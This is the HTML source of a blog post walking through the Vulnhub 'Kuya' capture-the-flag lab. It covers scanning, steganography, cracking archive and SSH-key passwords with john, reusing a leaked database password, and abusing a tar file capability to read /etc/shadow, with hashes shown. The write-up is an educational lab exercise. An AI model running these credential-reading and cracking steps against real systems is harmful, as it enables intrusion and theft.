@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html lang=en>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="DescriptionIn the last couple of days, Vulnhub published quite a few new boxes. One of them was Kuya. The difficulty is intermediate and you are required to have some knowledge in CTFs. By this, I">
+<meta name="keywords" content="vulnhub,ctf,walkthrough">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kuya Walkthrough">
+<meta property="og:url" content="https://infosecadventures.com/2019/03/03/Kuya-Walkthrough/index.html">
+<meta property="og:site_name" content="InfoSec Adventures">
+<meta property="og:description" content="DescriptionIn the last couple of days, Vulnhub published quite a few new boxes. One of them was Kuya. The difficulty is intermediate and you are required to have some knowledge in CTFs. By this, I">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://infosecadventures.com/2019/03/03/Kuya-Walkthrough/kuya.png">
+<meta property="og:image" content="https://infosecadventures.com/2019/03/03/Kuya-Walkthrough/kuya_site.png">
+<meta property="og:image" content="https://infosecadventures.com/2019/03/03/Kuya-Walkthrough/wireshark.png">
+<meta property="og:updated_time" content="2019-05-01T23:00:51.396Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Kuya Walkthrough">
+<meta name="twitter:description" content="DescriptionIn the last couple of days, Vulnhub published quite a few new boxes. One of them was Kuya. The difficulty is intermediate and you are required to have some knowledge in CTFs. By this, I">
+<meta name="twitter:image" content="https://infosecadventures.com/2019/03/03/Kuya-Walkthrough/kuya.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+
+    <title>Kuya Walkthrough</title>
+
+    <link rel="stylesheet" href="/css/style.css">
+    
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    
+    
+    
+      <link rel="alternate" href="/atom.xml" title="InfoSec Adventures" type="application/atom+xml">
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/instagram/">Instagram Feed</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/03/08/DC-1-Walkthrough/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/01/21/Identifying-and-Cracking-Hashes/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://infosecadventures.com/2019/03/03/Kuya-Walkthrough/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://infosecadventures.com/2019/03/03/Kuya-Walkthrough/&text=Kuya Walkthrough"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://infosecadventures.com/2019/03/03/Kuya-Walkthrough/&title=Kuya Walkthrough"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Kuya Walkthrough&body=Check out this article: https://infosecadventures.com/2019/03/03/Kuya-Walkthrough/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://infosecadventures.com/2019/03/03/Kuya-Walkthrough/&title=Kuya Walkthrough"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Description"><span class="toc-number">1.</span> <span class="toc-text">Description</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Scanning"><span class="toc-number">1.1.</span> <span class="toc-text">Scanning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Steganography"><span class="toc-number">1.2.</span> <span class="toc-text">Steganography</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Capturing-the-packets"><span class="toc-number">1.3.</span> <span class="toc-text">Capturing the packets</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cracking-the-7z-archive"><span class="toc-number">1.4.</span> <span class="toc-text">Cracking the 7z archive</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-the-SSH-keys"><span class="toc-number">1.5.</span> <span class="toc-text">Getting the SSH keys</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gaining-access"><span class="toc-number">1.6.</span> <span class="toc-text">Gaining access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-escalation"><span class="toc-number">1.7.</span> <span class="toc-text">Privilege escalation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reading-files-as-root"><span class="toc-number">1.8.</span> <span class="toc-text">Reading files as root</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reading-the-shadow-file"><span class="toc-number">1.8.1.</span> <span class="toc-text">Reading the shadow file</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-root-directory"><span class="toc-number">1.9.</span> <span class="toc-text">The root directory</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Root-shell"><span class="toc-number">1.9.1.</span> <span class="toc-text">Root shell?!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-you-go"><span class="toc-number">1.10.</span> <span class="toc-text">Before you go</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Kuya Walkthrough
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">InfoSec Adventures</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2019-03-03T00:48:33.000Z" itemprop="datePublished">2019.03.03.</time>
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF-Walkthroughs/">CTF Walkthroughs</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/ctf/">ctf</a>, <a class="tag-link" href="/tags/vulnhub/">vulnhub</a>, <a class="tag-link" href="/tags/walkthrough/">walkthrough</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5bf72b3154516f79"></script>
+
+<p><img src="kuya.png" alt></p>
+<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>In the last couple of days, Vulnhub published quite a few new boxes. One of them was Kuya. The difficulty is intermediate and you are required to have some knowledge in CTFs. By this, I mean that it contains steganography, which you are not likely to encounter in a real penetration testing scenario. Also, the author stated that there’ll be trolls ahead so we might come across with rabbit holes and dead ends. Enough said, let’s get started.</p>
+<h2 id="Scanning"><a href="#Scanning" class="headerlink" title="Scanning"></a>Scanning</h2><p>I started with the nmap scan as usual and got the following result back:</p>
+<pre><code>▲ ~ nmap -A -sC -p- 192.168.1.187
+Nmap scan report for mini (192.168.1.187)
+Host is up (0.00031s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
+| ssh-hostkey:
+|   2048 11:33:6d:34:f3:f2:12:9d:c6:6c:07:54:f0:86:53:d6 (RSA)
+|   256 45:77:11:0d:b4:c6:3e:a4:bc:7a:b2:5f:02:03:8e:37 (ECDSA)
+|_  256 00:27:20:4a:d8:b6:34:78:46:0e:cd:19:c2:9d:84:6a (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Welcome
+MAC Address: 08:00:27:39:31:D7 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>As you can see, we have 2 ports open. One of them is SSH, which is probably not vulnerable, so I continued with port 80. I ran <code>dirb</code> and <code>nikto</code>. I discovered a poorly configured wordpress installation, but the whole thing was a dead end. However, the initial site was working and contained some troll comments in the source.</p>
+<p><img src="kuya_site.png" alt="Kuya site"></p>
+<p>The picture was stored in the <code>loot</code> directory and it had directory listing enabled. I used <code>wget</code> to easily and recursively download the files.</p>
+<pre><code>▲ ~ wget -r http://192.168.1.187/loot
+
+--2019-03-03 20:19:50--  http://192.168.1.187/loot/1.jpg
+Reusing existing connection to 192.168.1.187:80.
+HTTP request sent, awaiting response... 200 OK
+Length: 16834 (16K) [image/jpeg]
+Saving to: ‘192.168.1.187/loot/1.jpg’
+
+192.168.1.187/loot/1.jpg 100%[==================================&gt;]
+
+2019-03-03 20:19:50 (122 MB/s) - ‘192.168.1.187/loot/1.jpg’ saved [16834/16834]
+
+--2019-03-03 20:19:50--  http://192.168.1.187/loot/2.jpg
+Reusing existing connection to 192.168.1.187:80.
+HTTP request sent, awaiting response... 200 OK
+Length: 7964 (7,8K) [image/jpeg]
+Saving to: ‘192.168.1.187/loot/2.jpg’
+
+192.168.1.187/loot/2.jpg 100%[==================================&gt;]
+
+2019-03-03 20:19:50 (917 MB/s) - ‘192.168.1.187/loot/2.jpg’ saved [7964/7964]
+
+--2019-03-03 20:19:50--  http://192.168.1.187/loot/3.jpg
+Reusing existing connection to 192.168.1.187:80.
+HTTP request sent, awaiting response... 200 OK
+Length: 7087 (6,9K) [image/jpeg]
+Saving to: ‘192.168.1.187/loot/3.jpg’
+
+192.168.1.187/loot/3.jpg 100%[==================================&gt;]
+
+2019-03-03 20:19:50 (199 MB/s) - ‘192.168.1.187/loot/3.jpg’ saved [7087/7087]
+
+--2019-03-03 20:19:50--  http://192.168.1.187/loot/4.jpg
+Reusing existing connection to 192.168.1.187:80.
+HTTP request sent, awaiting response... 200 OK
+Length: 173688 (170K) [image/jpeg]
+Saving to: ‘192.168.1.187/loot/4.jpg’
+
+192.168.1.187/loot/4.jpg 100%[==================================&gt;]
+
+2019-03-03 20:19:50 (76,5 MB/s) - ‘192.168.1.187/loot/4.jpg’ saved [173688/173688]
+
+--2019-03-03 20:19:50--  http://192.168.1.187/loot/image.jpeg
+Reusing existing connection to 192.168.1.187:80.
+HTTP request sent, awaiting response... 200 OK
+Length: 17911 (17K) [image/jpeg]
+Saving to: ‘192.168.1.187/loot/image.jpeg’
+
+192.168.1.187/loot/image 100%[==================================&gt;]
+
+2019-03-03 20:19:50 (449 MB/s) - ‘192.168.1.187/loot/image.jpeg’ saved [17911/17911]
+
+▲ ~ cd 192.168.1.187
+▲ ~/192.168.1.187 ls
+icons  index.html  loot
+▲ ~/192.168.1.187 cd loot
+▲ ~/192.168.1.187/loot ls
+1.jpg  2.jpg  3.jpg  4.jpg  image.jpeg
+</code></pre><h2 id="Steganography"><a href="#Steganography" class="headerlink" title="Steganography"></a>Steganography</h2><p>I got 5 images and used <code>steghide</code> on them to see whether they contain embedded data or not. I simply left the passphrases empty.</p>
+<pre><code>▲ ~/192.168.1.187/loot steghide extract -sf 1.jpg
+Enter passphrase:
+wrote extracted data to &quot;secret.txt&quot;.
+▲ ~/192.168.1.187/loot steghide extract -sf 2.jpg
+Enter passphrase:
+wrote extracted data to &quot;emb.txt&quot;.
+▲ ~/192.168.1.187/loot steghide extract -sf 3.jpg
+Enter passphrase:
+steghide: could not extract any data with that passphrase!
+▲ ~/192.168.1.187/loot steghide extract -sf 4.jpg
+Enter passphrase:
+wrote extracted data to &quot;loot.pcapng&quot;.
+▲ ~/192.168.1.187/loot steghide extract -sf image.jpeg
+Enter passphrase:
+wrote extracted data to &quot;robots.txt&quot;.
+</code></pre><p>One file was empty and one was pcapng, the other three were text files. Here are the contents of each text file. The first one contained base64 encoded text, which was not really helpful. The second one was a bit funnier, it contained some brainfuck programming language source code, so I just used an online interpreter to get the result.</p>
+<blockquote>
+<p>The first flag: <strong>V2hhdCBpcyBCYWx1dCA/</strong></p>
+</blockquote>
+<p>The <code>robots.txt</code> contained the file names in that directory.</p>
+<pre><code>▲ ~/192.168.1.187/loot cat secret.txt
+WW91IHJlYWxseSB0aG91Z2h0IGl0IHdvdWxkIGJlIHRoaXMgZWFzeSA/IEtlZXAgZGlnZ2luZyAhIExvdHMgb2YgdHJvbGxzIHRvIGRlZmVhdC4=
+▲ ~/192.168.1.187/loot cat secret.txt | base64 -d
+You really thought it would be this easy ? Keep digging ! Lots of trolls to defeat.
+▲ ~/192.168.1.187/loot cat emb.txt
++[---&gt;++&lt;]&gt;+.++[-&gt;++++&lt;]&gt;+.+++++++..[++&gt;---&lt;]&gt;--.++[-&gt;++&lt;]&gt;.[---&gt;+&lt;]&gt;+++.-.---------.--[---&gt;+&lt;]&gt;-.+.-.--[-&gt;+++&lt;]&gt;-.[-&gt;+++++++&lt;]&gt;.++++++.---.[--&gt;+++++&lt;]&gt;+++.+++[-&gt;++&lt;]&gt;.[--&gt;+++&lt;]&gt;.+++++++++.+.+.[----&gt;+&lt;]&gt;+++.+++[-&gt;++&lt;]&gt;.--[---&gt;+&lt;]&gt;.-----------.++++++.-[---&gt;+&lt;]&gt;--.-[---&gt;++&lt;]&gt;-.++++++++++.+[----&gt;+&lt;]&gt;+++.&gt;+[---&gt;++&lt;]&gt;.&gt;-[-----&gt;+&lt;]&gt;-.++[-&gt;++&lt;]&gt;..----.-[---&gt;++&lt;]&gt;+.-.--[++++&gt;---&lt;]&gt;.-------------.-[---&gt;+&lt;]&gt;+++.+[--&gt;+&lt;]&gt;+++++.+.++[-&gt;+++++&lt;]&gt;.--.+[-----&gt;+&lt;]&gt;.--[++&gt;---&lt;]&gt;.+[-&gt;++&lt;]&gt;.-[---&gt;++&lt;]&gt;+.--.-[----&gt;+++&lt;]&gt;-.
+▲ ~/192.168.1.187/loot cat robots.txt
+1.jpg
+2.&quot;
+3.&quot;
+4.&quot;
+5.&quot;
+image.jpeg
+</code></pre><h2 id="Capturing-the-packets"><a href="#Capturing-the-packets" class="headerlink" title="Capturing the packets"></a>Capturing the packets</h2><p><img src="wireshark.png" alt="Wireshark"></p>
+<p>There was not too much traffic in the packet capture. The only thing that stood out for me was the <code>loot.7z</code> file download. Wireshark has a handy feature that can export HTTP objects, you can find it under <code>File -&gt; Export object -&gt; HTTP</code>. This way, you can get the compressed file. I could have been easy if it was not encrypted.</p>
+<pre><code>▲ ~/Downloads 7z e loot.7z
+
+Scanning the drive for archives:
+1 file, 1976 bytes (2 KiB)
+
+Extracting archive: loot.7z
+--
+Path = loot.7z
+Type = 7z
+Physical Size = 1976
+Headers Size = 216
+Method = LZMA2:12 7zAES
+Solid = +
+Blocks = 1
+
+Enter password (will not be echoed):
+ERROR: Data Error in encrypted file. Wrong password? : loot/id_rsa
+ERROR: Data Error in encrypted file. Wrong password? : loot/id_rsa.pub
+</code></pre><h2 id="Cracking-the-7z-archive"><a href="#Cracking-the-7z-archive" class="headerlink" title="Cracking the 7z archive"></a>Cracking the 7z archive</h2><p>Time to use <code>7z2john</code> to extract hash. Note that you should download and use <code>john</code>‘s bleeding jumbo version from <a href="https://github.com/magnumripper/JohnTheRipper" target="_blank" rel="noopener">Github</a>, which contains the required files.</p>
+<pre><code>▲ ~/Downloads ./7z2john.pl loot.7z &gt; crackme_7z
+</code></pre><p>Now, simply pass the file to <code>john</code> and you are good to go.</p>
+<pre><code>▲ ~/Downloads john crackme_7z
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (7z, 7-Zip [SHA256 256/256 AVX2 8x AES])
+Cost 1 (iteration count) is 524288 for all loaded hashes
+Cost 2 (padding size) is 0 for all loaded hashes
+Cost 3 (compression type) is 2 for all loaded hashes
+Will run 4 OpenMP threads
+Proceeding with single, rules:Wordlist
+Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any
+Warning: Only 30 candidates buffered for the current salt, minimum 32
+needed for performance.
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+manchester       (loot.7z)
+1g 0:00:06:47 DONE 2/3 (2019-03-03 17:04) 0.002453g/s 25.59p/s 25.59c/s 25.59C/s katrina..hermosa
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+▲ ~/Downloads john crackme --show
+loot.7z:manchester
+
+1 password hash cracked, 0 left
+</code></pre><h2 id="Getting-the-SSH-keys"><a href="#Getting-the-SSH-keys" class="headerlink" title="Getting the SSH keys"></a>Getting the SSH keys</h2><p>I extracted the file with the password <code>manchester</code> and tried to log in with the private key, but it required a password. Bummer! By the way, the username can be found in the public key file. I thought, why not use <code>john</code> again?! So, I used <code>ssh2john</code> to get the hash and cracked it the same way I cracked the 7z archive.</p>
+<pre><code>▲ ~/Downloads ssh -i id_rsa test@192.168.1.187
+The authenticity of host &apos;192.168.1.187 (192.168.1.187)&apos; can&apos;t be established.
+ECDSA key fingerprint is SHA256:zyMHWQ6tB6OR+dKyv0X7ZXx6oCbYuH9/YbAxBwd5TCw.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added &apos;192.168.1.187&apos; (ECDSA) to the list of known hosts.
+Enter passphrase for key &apos;id_rsa&apos;:
+test@192.168.1.187: Permission denied (publickey).
+</code></pre><p>I went back to the downloaded bleeding edge <code>john</code> directory and used <code>ssh2john</code> to extract the hash.</p>
+<pre><code>▲ ~/Downloads ./ssh2john.pl id_rsa &gt; crackme_ssh
+</code></pre><p>You can see that the procedure is exactly the same as with the 7z file.</p>
+<pre><code>▲ ~/Downloads john crackme_ssh
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Proceeding with single, rules:Wordlist
+Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status
+Warning: Only 2 candidates buffered for the current salt, minimum 8
+needed for performance.
+Almost done: Processing the remaining buffered candidate passwords, if any
+Warning: Only 5 candidates buffered for the current salt, minimum 8
+needed for performance.
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+hello            (/root/Downloads/id_rsa)
+Proceeding with incremental:ASCII
+hello            (/root/Downloads/id_rsa)
+3g 0:00:00:46  3/3 (2019-03-03 18:01) 0.06518g/s 1800Kp/s 1800Kc/s 1800KC/s cpodso..cpop1.
+Session aborted
+▲ ~/Downloads john crackme_ssh --show 
+/root/Downloads/id_rsa:hello
+
+1 password hash cracked, 0 left
+</code></pre><h2 id="Gaining-access"><a href="#Gaining-access" class="headerlink" title="Gaining access"></a>Gaining access</h2><p>The password was a simple <code>hello</code>. With this information, I was able to log in as <code>test</code>. The second flag was hidden in the <code>sshscript.sh</code> file.</p>
+<pre><code>▲ ~/Downloads ssh -i id_rsa test@192.168.1.187
+Enter passphrase for key &apos;id_rsa&apos;:
+Linux mini 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Mar  2 20:35:16 2019 from 192.168.43.203
+test@mini:~$ ls -la
+total 20
+drwxr-xr-x 3 test root 4096 Dec 18 01:33 .
+drwxr-xr-x 4 root root 4096 Dec  2 00:26 ..
+-rw------- 1 test test  464 Dec 18 01:33 .bash_history
+drwx------ 2 test test 4096 Dec  2 14:34 .ssh
+-rw-r--r-- 1 test test  218 Mar  2 20:37 .wget-hsts
+test@mini:~$ cd .ssh
+test@mini:~/.ssh$ ls -la
+total 24
+drwx------ 2 test test 4096 Dec  2 14:34 .
+drwxr-xr-x 3 test root 4096 Dec 18 01:33 ..
+-rw-r--r-- 1 test test  391 Dec  2 14:34 authorized_keys
+-rw------- 1 test test 1766 Dec  2 03:15 id_rsa
+-rw-r--r-- 1 test test  391 Dec  2 03:15 id_rsa.pub
+-rwxr-xr-x 1 test test  115 Dec  2 14:30 sshscript.sh
+test@mini:~/.ssh$ cat sshscript.sh
+#!/bin/bash
+echo &quot;FInally you got a shell ! Here&apos;s a flag for you  5256247262. Let&apos;s see  where you go from here&quot;
+
+test@mini:~/.ssh$
+</code></pre><blockquote>
+<p>The second flag: <strong>5256247262</strong></p>
+</blockquote>
+<div class="addthis_tipjar_inline"></div>
+
+<h2 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h2><p>I did my usual enumeration, which included the <code>LinEnum.sh</code> script, but I couldn’t find anything useful like a kernel exploit or binaries with root privileges. Then, I went to the web server directory under <code>/var/www/html</code> and started looking for juicy files.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/** The name of the database for WordPress */</span></span><br><span class="line">define(<span class="string">'DB_NAME'</span>, <span class="string">'database_name_here'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database username */</span></span><br><span class="line">define(<span class="string">'DB_USER'</span>, <span class="string">'kuya'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database password */</span></span><br><span class="line">define(<span class="string">'DB_PASSWORD'</span>, <span class="string">'Chrepia##@@!!'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL hostname */</span></span><br><span class="line">define(<span class="string">'DB_HOST'</span>, <span class="string">'localhost'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database Charset to use in creating database tables. */</span></span><br><span class="line">define(<span class="string">'DB_CHARSET'</span>, <span class="string">'utf8'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The Database Collate type. Don't change this if in doubt. */</span></span><br><span class="line">define(<span class="string">'DB_COLLATE'</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** snip **/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="keyword">require_once</span>(ABSPATH . <span class="string">'wp-settings.php'</span>);</span><br></pre></td></tr></table></figure>
+<p>I found a database password in the <code>wp-config-sample.php</code> file. I used this information to switch user to <code>kuya</code>. Now, this was pretty easy. Let’s move on to his home directory. The <code>who_dis.txt</code> file contained the fourth flag.</p>
+<pre><code>kuya@mini:~$ cat who_dis.txt
+Well Done !
+
+BTW this was too easy :D
+
+Here is something for you IL0v3C@f3HaV@nA
+</code></pre><blockquote>
+<p>The fourth flag: <strong>IL0v3C@f3HaV@nA</strong></p>
+</blockquote>
+<h2 id="Reading-files-as-root"><a href="#Reading-files-as-root" class="headerlink" title="Reading files as root"></a>Reading files as root</h2><p>In the home directory, I noticed the <code>.bash_history</code> file. It’s always a good idea to check these, because they can contain valuable information.</p>
+<pre><code>kuya@mini:~$ cat .bash_history
+cd /home/kuya
+chown -R kuya
+chown -R kuya /home/kiya
+chown -R kuya /home/kuya
+su root
+cd /home/kuya
+cat /etc/shadow
+./tar -cvf shadow.tar /etc/shadow
+tar -cvf shadow.tar /etc/shadow
+which tar
+getcap -r / 2&gt;/dev/null
+setcap cap_dac_read_search=ep
+exit
+</code></pre><p>I had to brush up my knowledge on the <code>setcap</code> and <code>getcap</code> commands, so I checked the corresponding man pages and searched the internet.</p>
+<blockquote>
+<p>Linux’s thread/process privilege checking is based on capabilities. They’re flags to the thread that indicate what kind of additional privileges they’re allowed to use.</p>
+</blockquote>
+<p>The <code>setcap cap_dac_read_search=ep</code> command means that we are able to bypass file read permission checks, directory read and execute permission checks. This capability was probably was set on the <code>tar</code> executable because the shadow file was compressed with it and this means that it can read files as root.</p>
+<h3 id="Reading-the-shadow-file"><a href="#Reading-the-shadow-file" class="headerlink" title="Reading the shadow file"></a>Reading the shadow file</h3><p> I copied the tar command from the bash history and used it as it is. Then, I extracted the tar file and I was able to read the shadow file.</p>
+<pre><code>kuya@mini:~$ tar -cvf shadow.tar /etc/shadow
+tar: Removing leading `/&apos; from member names
+/etc/shadow
+kuya@mini:~$ tar xvf shadow.tar
+etc/shadow
+kuya@mini:~$ cat etc/shadow 
+root:$6$xmBqiwRc$UE1ERWQecpCHwNsyE4yhSYv8wMD1H1yvB4TCBZQaoZMuxioJ0c7xE/Q/WwiRK2Vdf2Y2KGeHCh4NHAq5L4JTg0:17863:0:99999:7:::
+daemon:*:17863:0:99999:7:::
+bin:*:17863:0:99999:7:::
+sys:*:17863:0:99999:7:::
+sync:*:17863:0:99999:7:::
+games:*:17863:0:99999:7:::
+man:*:17863:0:99999:7:::
+lp:*:17863:0:99999:7:::
+mail:*:17863:0:99999:7:::
+news:*:17863:0:99999:7:::
+uucp:*:17863:0:99999:7:::
+proxy:*:17863:0:99999:7:::
+www-data:*:17863:0:99999:7:::
+backup:*:17863:0:99999:7:::
+list:*:17863:0:99999:7:::
+irc:*:17863:0:99999:7:::
+gnats:*:17863:0:99999:7:::
+nobody:*:17863:0:99999:7:::
+systemd-timesync:*:17863:0:99999:7:::
+systemd-network:*:17863:0:99999:7:::
+systemd-resolve:*:17863:0:99999:7:::
+systemd-bus-proxy:*:17863:0:99999:7:::
+_apt:*:17863:0:99999:7:::
+messagebus:*:17863:0:99999:7:::
+sshd:*:17863:0:99999:7:::
+kuya:$6$MpPRKfei$KvGUeoeKXHNg8iSzMHPST4vtIe3GbjAHAf2gtJijQciwLtaeBNMi0pHjx1BSetZB/au8x.yKF9SB.nLtW3WRT.:17863:0:99999:7:::
+test:!:17865:0:99999:7:::
+mysql:!:17867:0:99999:7:::
+</code></pre><h2 id="The-root-directory"><a href="#The-root-directory" class="headerlink" title="The root directory"></a>The root directory</h2><p>After I confirmed that I can read files like I’m root, I used tar on the root directory. This way I could read the final flag, which was hidden in the <code>M3M3L0rd.txt</code> file.</p>
+<blockquote>
+<p>The fifth flag: <strong>WeasleyIsOurKing</strong></p>
+</blockquote>
+<p>I don’t know if all of the flags are valid flags because the author planted 3 of them, but I found 5.</p>
+<h3 id="Root-shell"><a href="#Root-shell" class="headerlink" title="Root shell?!"></a>Root shell?!</h3><p>I tried to crack the root password, but I gave up after some time… Sadly, I couldn’t find any other solution to get a root shell. Did you manage to get a root shell or did you do something different? Let me know, in the comments!</p>
+<h2 id="Before-you-go"><a href="#Before-you-go" class="headerlink" title="Before you go"></a>Before you go</h2><p>If you found this article helpful, please share to help others with similar interest find it! + Feedbacks and donations are always welcome!</p>
+<p><br><div align="center" class="addthis_inline_share_toolbox"></div><br></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
